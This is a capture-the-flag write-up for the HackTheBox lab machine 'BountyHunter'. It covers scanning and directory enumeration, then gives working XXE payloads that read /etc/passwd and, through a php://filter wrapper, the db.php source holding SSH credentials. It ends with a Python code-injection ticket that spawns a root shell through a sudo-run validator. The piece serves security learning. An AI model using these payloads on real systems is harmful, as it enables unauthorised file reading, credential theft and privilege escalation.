# BountyHunter

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/d25dc96a-ce52-42c5-a472-d9d38377b5df)

## Difficulty = Easy
--- 
First of all we run our nmap scan

```sh
# Nmap 7.94 scan initiated Thu Aug 10 12:10:16 2023 as: nmap -p- -sCV --min-rate=1000 -oN nmap.txt -v 10.10.11.100
Increasing send delay for 10.10.11.100 from 40 to 80 due to 87 out of 289 dropped probes since last increase.
Warning: 10.10.11.100 giving up on port because retransmission cap hit (10).
Increasing send delay for 10.10.11.100 from 640 to 1000 due to 79 out of 262 dropped probes since last increase.
Nmap scan report for 10.10.11.100
Host is up (0.23s latency).
Not shown: 45138 closed tcp ports (conn-refused), 20395 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 10 12:16:07 2023 -- 1 IP address (1 host up) scanned in 351.09 seconds
```

- Navigating to port 80 - http, gives us a website

![](https://i.imgur.com/no9CW9K.png)

- viewing source doesn't seems to have anything much except from a few clues to test out vulnerabilities on the website with a security tool called `Burp Suite`

![](https://i.imgur.com/ZpmMhil.png)

- Also clicking `portal` on the web page :

![](https://i.imgur.com/DsP1Zwf.png)

- Takes us here :

![](https://i.imgur.com/aDAzybh.png)

- But after clicking `Go here` on the web page we get another web page, which looks like a **Bounty Report System** (Trust me, shit doesn't work)

![](https://i.imgur.com/6FHV1Eg.png)

- Fired up `Burp suite` and after numerous test, i noticed that this page is vulnerable to `XXE injection`

![](https://i.imgur.com/5vSbY1h.png)

*payload :*

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

- Just to be sure we are doing the right thing, Directory Bruteforce:

```sh
sec-fortress@Pwn-F0rk-3X3C:~/HTB/BountyHunter$ gobuster dir -u http://10.10.11.100/ -w ~/SecLists-master/Discovery/Web-Content/big.txt -b 401,400,400,501,402,404,403 -x bak,zip,php,PHP,txt,html -t 40 2>/dev/null                         
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.100/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /home/sec-fortress/SecLists-master/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404,403,401,400,501,402
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,PHP,txt,html,bak,zip
[+] Timeout:                 10s
===============================================================
2023/08/10 12:29:18 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 25169]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]
/portal.php           (Status: 200) [Size: 125]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]

===============================================================
2023/08/10 12:52:54 Finished
===============================================================
```

- Yeah, definitely we can read files on the server, Now we need one more important file, maybe some file containing stored ssh creds
- After much Enumeration i decided to check each and every directory from our scan with gobuster, i found out db.php contains an empty page, why?? 🤔

![](https://i.imgur.com/7ifOLcR.png)

- After much reading, there is a way to print out content of php files through XXE injection using a php wrapper (*php://filter/convert.base64-encode/resource=file.php*), you can read more on it from [here](https://www.pwny.cc/web-attacks/xml-external-entity-xxe)
- Doing this to our target, gives us a base 64 encoded text

![](https://i.imgur.com/xziDR8I.png)

*payload :*
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
<data>&example;</data>
```

Looks like we got a password, let try it out on SSH with the user `development`

![](https://i.imgur.com/Hzjzo1J.png)

- It works :

![](https://i.imgur.com/bO2cZci.png)

### Privilege Escalation

> Since we have gotten shell as a normal user in the default home directory, let escalate privileges 😀

- First of all i ran `sudo -l` to confirm if there are executables/binaries we can run with sudo

![](https://i.imgur.com/pDz1CSj.png)

- There is, looks like a ticket validator, let see what we can do with it 

![](https://i.imgur.com/RbsFNYp.png)

Just a python file that validates ticket 🤔, let us read source-code

![](https://i.imgur.com/kYRmVgn.png)

- hmmmmmm, here is what i think :
	1. When it prompts us for a ticket file, we need to specify a file with a markdown format
	2. Once this is validated, it opens the file and check if the first line has > `# Skytrain Inc`
	3. Also checks if the second line has > `## Ticket to `
	4. It then looks for a line with numbers that add up to each other greater than 100

- i decided to change to the `/opt/skytrain_inc/invalid_tickets` folder and saw sample code

![](https://i.imgur.com/7ezkild.png)

- since we are not able to to write to this file, i created a sample and directed it to /tmp and named it `segun.py`, then gave it `777` permmissions

![](https://i.imgur.com/k7CLY9G.png)

- i edited the file and changed it from this :

```md
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket
```

To this:

```md
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**18 + __import__('os').system('/bin/bash')**
##Issued: 2021/04/06
#End Ticket
```

- ... and we got Root, Bankkaaaaiii 🎎

![](https://i.imgur.com/HZ8A2nZ.png)

